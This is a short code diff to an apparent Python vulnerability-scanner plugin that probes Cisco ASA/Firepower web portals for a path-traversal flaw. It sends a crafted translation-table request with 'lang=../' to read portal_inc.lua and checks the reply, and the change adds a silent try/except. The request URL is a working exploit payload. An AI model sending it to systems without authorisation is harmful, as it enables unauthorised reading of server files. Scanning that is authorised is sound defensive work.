@@ -19,8 +19,11 @@ class Script(BaseScript):
         if self.base_url:
             url = self.base_url + '+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../'
             async with ClientSession() as session:
-                async with session.get(url=url) as response:
-                    if response !=None:
-                        text = await response.text()
-                        if 'dofile' in text and 'cisco.com' in text:
-                            yield url
+                try:
+                    async with session.get(url=url) as response:
+                        if response !=None:
+                            text = await response.text()
+                            if 'dofile' in text and 'cisco.com' in text:
+                                yield url
+                except:
+                    pass
